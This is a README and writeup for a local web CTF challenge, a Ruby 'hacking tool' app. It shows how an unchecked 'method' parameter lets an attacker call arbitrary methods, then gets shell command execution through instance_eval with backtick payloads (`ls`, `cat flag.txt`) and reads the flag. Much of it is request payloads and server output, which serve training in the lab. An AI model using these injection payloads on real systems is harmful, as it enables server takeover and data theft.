# Hacking Tool 🛠

> web

Author: [lilc4t](https://github.com/masterT)

This is my custom hacking tool, very useful during CTFs 🚩!

http://localhost:23200/


## Setup

Requirements:
- docker

Start:

```shell
docker-compose up
```

## Writeup

The page as a form has 4 inputs:
- message
- option (commented)
- method

Here is the source code:

```html
<form action="/" method="POST">
  <textarea autofocus name="message"></textarea>
  <!-- <input type="text" name="option"/> -->
  <br>
  <select name="method">
      <option value="decode_base64">Decode base64</option>
      <option value="encode_base64">Encode base64</option>
      <option value="encode_hexadecimal">Encode hexadecimal</option>
      <option value="decode_hexadecimal">Decode hexadecimal</option>
      <option value="md5">Md5</option>
      <option value="sha1">Sha1</option>
      <option value="sha2">Sha2</option>
  </select>
  <input type="submit">
  <hr/>
  <textarea></textarea>
</form>
```

Here is a normal request payload:

```
message=test&method=encode_base64
```

And it's response:

```html
<!-- ... -->
  <textarea>dGVzdA==
</textarea>
<!-- ... -->
```

It looks like it performs the action specify by the `method` param on the `message` param.  In this case encode `test` in base 64.

Now let's try to break it!

Request payload:

```
message=test&method=foobar
```

Response:

```html
<!-- ... -->
  <textarea></textarea>
   <!-- <div class="error">undefined method `foobar' for Tool:Class</div> -->
<!-- ... -->
```

We have an error message!

After some research on the internet you can figure out that the language used is [Ruby](https://www.ruby-lang.org).

It can be code injection if the param `method` is the method name called on the `Tool` class.

Let's try it with the [methods](https://ruby-doc.org/core-2.2.0/Object.html#method-i-methods) method. It should return an array with the methods symbol defined for this class.


```
message=test&method=methods
```

```html
<!-- ... -->
  <textarea>[:decode_base64, :encode_base64, :encode_hexadecimal, :decode_hexadecimal, :md5, :sha1, :sha2, :exposed_methods, :new, :allocate, :superclass, :json_creatable?, :<=>, :include, :<=, :>=, :==, :===, :included_modules, :include?, :name, :ancestors, :instance_methods, :public_instance_methods, :protected_instance_methods, :private_instance_methods, :constants, :const_get, :const_set, :const_defined?, :class_variables, :remove_class_variable, :class_variable_get, :class_variable_set, :class_variable_defined?, :public_constant, :private_constant, :deprecate_constant, :singleton_class?, :module_exec, :class_exec, :freeze, :inspect, :const_missing, :class_eval, :method_defined?, :public_method_defined?, :prepend, :<, :>, :private_method_defined?, :protected_method_defined?, :public_class_method, :module_eval, :to_s, :private_class_method, :autoload, :autoload?, :instance_method, :public_instance_method, :to_json, :instance_of?, :kind_of?, :is_a?, :tap, :public_send, :method, :public_method, :singleton_method, :remove_instance_variable, :define_singleton_method, :instance_variable_set, :extend, :to_enum, :enum_for, :=~, :!~, :eql?, :respond_to?, :object_id, :send, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :itself, :taint, :tainted?, :untaint, :untrust, :untrusted?, :trust, :frozen?, :methods, :singleton_methods, :protected_methods, :private_methods, :public_methods, :instance_variable_get, :instance_variables, :instance_variable_defined?, :!, :!=, :__send__, :equal?, :instance_eval, :instance_exec, :__id__]</textarea>
<!-- ... -->
```

There we have it! There is a lot of methods defined for the class `Tool`.


Let's check the private methods using [private_methods](https://ruby-doc.org/core-2.2.0/Object.html#method-i-private_methods):

```
message=test&method=private_methods
```

```html
<!-- ... -->
  <textarea>[:initialize, :inherited, :using, :attr, :attr_reader, :attr_writer, :attr_accessor, :remove_const, :remove_method, :method_added, :method_removed, :protected, :method_undefined, :undef_method, :public, :private, :initialize_copy, :initialize_clone, :alias_method, :included, :extended, :prepended, :define_method, :DelegateClass, :humanize, :Digest, :sprintf, :format, :Integer, :Float, :String, :Array, :Hash, :fail, :iterator?, :__method__, :catch, :__dir__, :loop, :global_variables, :throw, :block_given?, :raise, :__callee__, :eval, :URI, :j, :Rational, :trace_var, :untrace_var, :at_exit, :Complex, :set_trace_func, :gem, :select, :caller, :caller_locations, :`, :test, :fork, :exit, :JSON, :sleep, :jj, :respond_to_missing?, :load, :gem_original_require, :exec, :exit!, :syscall, :open, :printf, :print, :putc, :puts, :gets, :readlines, :readline, :initialize_dup, :p, :spawn, :rand, :srand, :proc, :lambda, :abort, :system, :trap, :require, :require_relative, :binding, :local_variables, :warn, :method_missing, :singleton_method_added, :singleton_method_removed, :singleton_method_undefined]</textarea>
<!-- ... -->  
```

Nice, the method [\`](https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60) is defined.

> `cmd` → string
> Returns the standard output of running cmd in a subshell. The built-in syntax %x{...} uses this method. Sets $? to the process status.

We could use the method [instance_variables](https://ruby-doc.org/core-2.2.0/Object.html#method-i-instance_variables) to execute private method. This way we could use the [\`](https://ruby-doc.org/core-2.2.0/Kernel.html#method-i-60) method and execute code on the serveur.

> instance_eval(string [, filename [, lineno]] ) → obj
> Evaluates a string containing Ruby source code, or the given block, within the context of the receiver (obj). In order to set the context, the variable self is set to obj while the code is executing, giving the code access to obj's instance variables and private methods.

Let's try to list the current directory:

```
message=`ls`&method=instance_eval
```

```html
<!-- ... -->
  <textarea>Gemfile
Gemfile.lock
app.rb
flag.txt
tool.rb
</textarea>
<!-- ... -->
```

Let's read the `flag.txt` file:

```
message=`cat flag.txt`&method=instance_eval
```

```html
<!-- ... -->
  <textarea>CFI{send_is_a_very_dangerous_method}</textarea>
<!-- ... -->  
```  

Got the flag 🎉!
